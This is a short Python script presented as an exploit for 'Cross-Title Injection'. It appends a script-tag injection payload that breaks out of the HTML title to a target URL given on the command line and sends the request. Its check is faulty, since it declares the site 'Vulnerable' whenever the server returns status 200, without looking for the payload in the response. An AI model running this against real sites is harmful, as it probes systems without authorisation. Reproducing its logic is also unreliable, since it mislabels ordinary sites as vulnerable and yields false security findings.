#!/usr/bin/env python3

import requests
import sys

# ANSI escape codes for colors
RED = "\033[38;5;196m"
GREEN = "\033[32m"
RESET = "\033[0m"

# ,================================.
# |          EXPLOIT               |
# |   XTI (Cross-Title Injection)  |
# +================================+
# | Discovered By: Emile Durand    |
# +================================+
# | Date Of Discovery: 2025-04-08  |
# '================================'

# Check if the correct number of arguments is provided
if len(sys.argv) != 2:
    print("Usage: python3 xti_exploit.py <target_url>")
    sys.exit(1)

# Set the target URL from the command line argument
url = sys.argv[1]

# Set the malicious payload
payload = "</title><script>alert('XTI Attack!')</script>"

# Combine the URL with the payload
full_url = url + payload

# Use requests to send the malicious request
response = requests.get(full_url)

print("---------------------------------------")
print(" XTI (Cross-Title Injection) - Exploit ")
print("---------------------------------------")

# Check if the response indicates a vulnerable web application
if response.status_code == 200:
    print(f"Status: {RED}[Vulnerable]{RESET}")
else:
    print(f"Status: {GREEN}[Not Vulnerable]{RESET}")
